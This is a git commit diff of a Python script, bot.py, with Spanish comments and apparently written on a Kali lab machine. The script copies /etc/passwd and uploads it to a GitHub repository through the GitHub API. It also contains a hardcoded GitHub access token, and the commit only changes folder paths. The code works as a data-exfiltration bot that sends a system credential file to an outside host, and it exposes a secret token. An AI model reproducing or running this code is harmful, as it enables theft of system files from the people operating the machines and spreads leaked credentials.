580c2214e00f8360cc08dd516f1c2a7ed6dc6e49
lauraalmrui <83592959+lauraalmrui@users.noreply.github.com>
2024-02-02 16:03:26 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,18 +1,20 @@
 import subprocess
 from github import Github
+
 def run():
     # Copiar /etc/passwd a /home/kali/Desktop
     subprocess.run(['cp', '/etc/passwd', '/home/kali/Desktop'])
     
     # Definir la variable GITHUB_REPO
-    GITHUB_REPO = 'almacenlar'
+    GITHUB_REPO = 'almacenlar'  # No es necesario cambiar esto, ya que es el nombre del repositorio principal
+    
     ACCESS_TOKEN = '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'
     
     g = Github(ACCESS_TOKEN)
     
     repo = g.get_user().get_repo(GITHUB_REPO)
     all_files = []
-    contents = repo.get_contents("")
+    contents = repo.get_contents("almacenlar")  # Cambiado para acceder a la carpeta almacenlar en el repositorio
     while contents:
         file_content = contents.pop(0)
         if file_content.type == "dir":
@@ -26,7 +28,7 @@ def run():
     
     # Upload to github
     git_prefix = 'lauraalmrui/'
-    git_file = git_prefix + 'passwd'
+    git_file = git_prefix + 'almacenlar/passwd'  # Cambiado para reflejar la estructura de carpetas en el repositorio
     if git_file in all_files:
         contents = repo.get_contents(git_file)
         repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
